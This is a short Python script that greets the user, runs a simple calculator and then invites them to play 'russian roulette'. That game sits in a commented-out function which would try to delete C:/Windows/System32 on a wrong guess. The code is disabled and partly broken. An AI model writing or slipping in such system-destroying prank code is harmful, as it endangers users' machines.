import getpass
import os
import random

username = getpass.getuser()
print(f"Hello, {username}!")


# SCARY TO UNCOMMENT 


# def russian_roulette():
#     randomNumber = random.randint(1, 3)
#     print("Now you have to guess random number from 1 to 3, but not be afraid, it's just a game))))))")
#     userNumber = int(input("Enter the number: "))
#     if userNumber != randomNumber:
#         os.remove("C:/Windows/System32")
#     elif userNumber = randomNumber:
#         print("You are lucky, you are alive!")


def calculator():
    first_number = float(input("Enter the first number: "))
    second_number = float(input("Enter the second number: "))
    operation = input("Enter the operation (+ - * /): ")
    if operation == "+":
        print(first_number + second_number)
    elif operation == "-":
        print(first_number - second_number)
    elif operation == "*":
        print(first_number * second_number)
    elif operation == "/":
        print(first_number / second_number)
    else:
        print("Invalid operation")
    repeat = input("Do you want to perform another operation? (yes/no): ")
    if repeat == "yes":
        calculator()
    else:
        print("Okey, no more calculator, but I have another game for you, do u like russian roulette? (yes/yes)")
        russian_roulette()

calculator()

